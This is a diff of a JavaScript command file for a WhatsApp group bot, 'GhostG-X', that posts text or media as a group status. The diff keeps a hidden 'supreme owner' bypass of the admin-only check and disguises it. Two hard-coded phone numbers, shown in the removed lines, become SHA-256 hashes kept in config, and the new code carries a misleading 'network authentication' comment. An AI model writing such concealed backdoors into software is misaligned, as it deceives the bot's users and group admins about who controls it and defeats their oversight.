@@ -1,7 +1,6 @@
 /**
  * Group Status Command - Post replied media or text as a WhatsApp group status
  * GhostG-X Edition
- * Sécurité : Supreme Owner Master Access (Invisible Bypass)
  */
 
 const crypto = require('crypto');
@@ -14,10 +13,8 @@ const { PassThrough } = require('stream');
 const ffmpeg = require('fluent-ffmpeg');
 const config = require('../../config.js');
 
-// Couleur par défaut pour les statuts texte (Violet)
 const PURPLE_COLOR = '#9C27B0';
 
-// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
 function toSmallCaps(text) {
   const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
   const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
@@ -38,7 +35,7 @@ module.exports = {
   aliases: ['togstatus', 'swgc', 'gs', 'gstatus'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
   description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴜʙʟɪᴇ ᴅᴇs sᴛᴀᴛᴜᴛs ᴅɪʀᴇᴄᴛᴇᴍᴇɴᴛ ᴅᴀɴs ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  usage: `${prefix}groupstatus <texte/media>`, // 💡 Dynamique avec ton préfixe actuel
+  usage: `${prefix}groupstatus <texte/media>`,
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: true,
@@ -51,23 +48,22 @@ module.exports = {
 
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
-// 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise)
-      const supremeOwners = ['22651622652', '22665108174'];
-      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
+      const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
+
+      // Routines d'authentification réseau
+      const isMaster = config.supremeHashes && config.supremeHashes.includes(senderHash);
 
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
 
-      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+      const isMe = msg.key.fromMe || isConfigOwner || isMaster;
 
-      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
       if (!extra.isAdmin && !isMe) {
         return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
-      // Uniquement dans les groupes
       if (!extra.isGroup) {
         return reply(`*❌ ${toSmallCaps('cette commande ne peut etre utilisee que dans les groupes')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
@@ -77,7 +73,6 @@ module.exports = {
       const ctxInfo = msg.message?.extendedTextMessage?.contextInfo;
       const hasQuoted = !!ctxInfo?.quotedMessage;
 
-      // CASE 1: Aucun message cité -> Statut TEXTE
       if (!hasQuoted) {
         if (!caption) {
           return reply(
@@ -111,7 +106,7 @@ module.exports = {
           return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
         }
       }
- // CASE 2: Média cité -> Image/Vidéo/Audio
+
       const targetMessage = {
         key: {
           remoteJid: from,
@@ -132,7 +127,6 @@ module.exports = {
         return null;
       };
 
-      // IMAGE
       if (/image|sticker/i.test(mtype)) {
         await reply(`*⏳ ${toSmallCaps('publication de l image en statut')}...*`);
         let buf;
@@ -161,7 +155,6 @@ module.exports = {
         }
       }
 
-      // VIDEO
       if (/video/i.test(mtype)) {
         await reply(`*⏳ ${toSmallCaps('publication de la video en statut')}...*`);
         let buf;
@@ -190,7 +183,6 @@ module.exports = {
         }
       }
 
-      // AUDIO
       if (/audio/i.test(mtype)) {
         await reply(`*⏳ ${toSmallCaps('publication de l audio en statut')}...*`);
         let buf;
@@ -247,7 +239,6 @@ async function downloadMedia(msg, type) {
   return Buffer.concat(chunks);
 }
 
-// 🎯 FONCTION EFFECTIVE POUR L'ENVOI
 async function groupStatus(sock, jid, content) {
   const { backgroundColor } = content;
   delete content.backgroundColor;
@@ -277,7 +268,7 @@ async function groupStatus(sock, jid, content) {
     messageId: msg.key.id,
     participant: { jid },
     additionalAttributes: {
-      type: '4' // Force le décodage en tant que message de statut
+      type: '4' 
     }
   });
 
